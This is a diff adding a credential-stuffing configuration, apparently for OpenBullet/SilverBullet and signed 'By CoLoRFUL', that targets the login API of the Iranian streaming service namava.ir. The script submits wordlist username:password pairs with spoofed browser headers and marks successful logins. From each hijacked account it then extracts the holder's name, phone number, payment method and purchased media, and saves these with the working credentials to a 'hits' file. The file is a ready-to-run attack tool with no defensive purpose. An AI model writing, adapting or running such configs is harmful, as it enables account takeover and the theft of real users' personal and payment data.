@@ -1,0 +1,110 @@
+[SETTINGS]
+{
+  "Name": "namava",
+  "SuggestedBots": 120,
+  "MaxCPM": 0,
+  "LastModified": "2021-10-09T06:04:39.3515436-07:00",
+  "AdditionalInfo": "",
+  "Author": "<===== By CoLoRFUL =====>",
+  "Version": "1.4.3 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#RAN_UA FUNCTION GetRandomUA -> VAR "UA" 
+
+#POST_DATA REQUEST POST "https://www.namava.ir/api/v1.0/accounts/login/by-email" 
+  CONTENT "{\"UserName\":\"<USER>\",\"Password\":\"<PASS>\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "Host: www.namava.ir" 
+  HEADER "Connection: keep-alive" 
+  HEADER "sec-ch-ua: \"Chromium\";v=\"94\", \"Google Chrome\";v=\"94\", \";Not A Brand\";v=\"99\"" 
+  HEADER "X-Application-Type: WebClient" 
+  HEADER "X-Client-Version: 2.17.0" 
+  HEADER "sec-ch-ua-mobile: ?0" 
+  HEADER "User-Agent: <UA>" 
+  HEADER "Accept: application/json, text/plain, */*" 
+  HEADER "sec-ch-ua-platform: \"Windows\"" 
+  HEADER "Origin: https://www.namava.ir" 
+  HEADER "Sec-Fetch-Site: same-origin" 
+  HEADER "Sec-Fetch-Mode: cors" 
+  HEADER "Sec-Fetch-Dest: empty" 
+  HEADER "Referer: https://www.namava.ir/auth/login-email" 
+  HEADER "Accept-Language: en-US,en;q=0.9" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "Content-Length: 54" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "true" 
+  KEYCHAIN Failure OR 
+    KEY "Invalid " 
+
+#GET_INFO REQUEST GET "https://www.namava.ir/api/v1.0/users/info" 
+  
+  HEADER "Host: www.namava.ir" 
+  HEADER "Connection: keep-alive" 
+  HEADER "sec-ch-ua: \"Chromium\";v=\"94\", \"Google Chrome\";v=\"94\", \";Not A Brand\";v=\"99\"" 
+  HEADER "Accept: application/json, text/plain, */*" 
+  HEADER "X-Application-Type: WebClient" 
+  HEADER "X-Client-Version: 2.17.0" 
+  HEADER "sec-ch-ua-mobile: ?0" 
+  HEADER "User-Agent: <UA>" 
+  HEADER "sec-ch-ua-platform: \"Windows\"" 
+  HEADER "Sec-Fetch-Site: same-origin" 
+  HEADER "Sec-Fetch-Mode: cors" 
+  HEADER "Sec-Fetch-Dest: empty" 
+  HEADER "Referer: https://www.namava.ir/cold-start" 
+  HEADER "Accept-Language: en-US,en;q=0.9" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+
+#PARSE_FN PARSE "<SOURCE>" JSON "result['firstName']" JTokenParsing=TRUE CreateEmpty=FALSE -> CAP "Firstname" 
+
+#PARSE_LN PARSE "<SOURCE>" JSON "result['lastName']" JTokenParsing=TRUE CreateEmpty=FALSE -> CAP "Lastname" 
+
+#PARSE_PHONE PARSE "<SOURCE>" JSON "result['registrationPhone']" JTokenParsing=TRUE CreateEmpty=FALSE -> CAP "Phonenumber" 
+
+#PARSE_SUBSCRIPTIOIN PARSE "<SOURCE>" JSON "result['subscription']['paymentMethod']" JTokenParsing=TRUE CreateEmpty=FALSE -> CAP "Subscription" 
+
+#PARSE_PURCHASEDMEDIA PARSE "<SOURCE>" JSON "result['purchasedMedias']" JTokenParsing=TRUE CreateEmpty=FALSE -> CAP "Purchased Media" 
+
+UTILITY File "Namava hits.txt" AppendLines "<USER>:<PASS>\\nFirstname = <Firstname> | Lastname = <Lastname> | Phonenumber = <Phonenumber> | Subscription = <Subscription> | Purchased Media = <Purchased Media>\\n(*) By CoLoRFUL\\n_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-" 
+
